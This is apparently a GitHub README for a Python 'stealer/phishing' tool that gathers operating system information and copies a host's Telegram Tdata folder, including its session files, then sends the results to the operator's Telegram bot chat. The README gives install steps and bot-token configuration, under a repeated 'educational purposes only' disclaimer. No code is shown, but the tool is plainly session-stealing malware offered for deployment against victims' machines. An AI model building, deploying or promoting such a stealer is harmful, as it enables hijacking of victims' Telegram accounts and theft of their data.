# telegram_and_OSinfo stealer/phishing

ONLY FOR EDUCATIONAL AND RESEARCH PURPOSES — FOR STUDYING SYSTEM ADMINISTRATION AND SECURITY. DO NOT USE FOR UNAUTHORIZED ACCESS, PHISHING, OR ANY MALICIOUS ACTIVITIES; THE AUTHOR IS NOT RESPONSIBLE FOR IMPROPER USE.

ONLY FOR EDUCATIONAL AND RESEARCH PURPOSES — FOR STUDYING SYSTEM ADMINISTRATION AND SECURITY. DO NOT USE FOR UNAUTHORIZED ACCESS, PHISHING, OR ANY MALICIOUS ACTIVITIES; THE AUTHOR IS NOT RESPONSIBLE FOR IMPROPER USE.

ONLY FOR EDUCATIONAL AND RESEARCH PURPOSES — FOR STUDYING SYSTEM ADMINISTRATION AND SECURITY. DO NOT USE FOR UNAUTHORIZED ACCESS, PHISHING, OR ANY MALICIOUS ACTIVITIES; THE AUTHOR IS NOT RESPONSIBLE FOR IMPROPER USE.


A small Telegram bot and utilities to gather and report operating system information from a host.

## Features
- Query basic OS info.
- Tdata folder (includes cache and session)
- Send results to a Telegram chat.
- Lightweight and easy to deploy.

## Requirements
- Python 3.8+
- A Telegram bot token (from BotFather)

## Quick install
1. Clone the repo:
    ```
    git clone <https://github.com/diethylmorphine/TelegramAndOSinfo>
    ```
2. Select folder:
    ```
    cd telegram_and_OSinfo
    ```
4. Install dependencies:
    ```
    pip install -r requirements.txt
    ```
    or
    ```
    pip install aiogram==2.9.2 # or any other aiogram 2.x.x
    ```
## Configuration

You need to set BOT_TOKEN and ADMIN_ID in main.py / 10,11 lines

example:
TOKEN = "123654789:AAFQlHLVYJ6LD2b8lelj7BoBi6VJPTo6CWs"
ADMIN_ID = "987456123"

## Usage
Run the script:
```
python main.py
```

Common commands (Telegram)
- /start - link to developer's page

## File structure (suggested)
- main.py — Telegram bot entrypoint
- osinfo.py — gathers and formats system info
- requirements.txt
- README.md

## Troubleshooting
- Bot not responding: check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.

## AUTHOR

### diethylmorphine
### https://morphine.app

## License
In LICENSE file.
